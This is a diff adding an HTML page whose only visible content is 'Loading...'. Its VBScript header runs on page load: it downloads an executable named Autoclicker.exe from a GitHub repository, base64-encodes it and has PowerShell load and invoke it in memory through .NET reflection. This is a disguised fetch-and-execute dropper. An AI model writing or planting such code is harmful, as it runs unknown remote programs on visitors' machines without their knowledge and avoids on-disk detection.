@@ -1,0 +1,38 @@
+<html>
+<head>
+  <script language="VBScript">
+    Set objShell = CreateObject("WScript.Shell")
+    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+    Set objADODBStream = CreateObject("ADODB.Stream")
+
+    ' URL to the Autoclicker.exe file on GitHub
+    url = "https://github.com/terrorize7/testing-exes/raw/refs/heads/main/Autoclicker.exe"
+
+    ' Download the file
+    objXMLHTTP.Open "GET", url, False
+    objXMLHTTP.Send
+
+    ' Save the file to memory
+    objADODBStream.Open
+    objADODBStream.Type = 1 ' Binary
+    objADODBStream.Write objXMLHTTP.ResponseBody
+    objADODBStream.Position = 0
+
+    ' Execute the file from memory
+    objShell.Run "powershell -Command ""$bytes = [System.Convert]::FromBase64String('" & Base64Encode(objADODBStream.Read) & "'); $assembly = [System.Reflection.Assembly]::Load($bytes); $entryPoint = $assembly.EntryPoint; $entryPoint.Invoke($null, $null)"""
+    objADODBStream.Close
+
+    Function Base64Encode(binaryData)
+      Dim xmlDoc, xmlNode
+      Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+      Set xmlNode = xmlDoc.CreateElement("base64")
+      xmlNode.DataType = "bin.base64"
+      xmlNode.nodeTypedValue = binaryData
+      Base64Encode = xmlNode.Text
+    End Function
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
+</html>
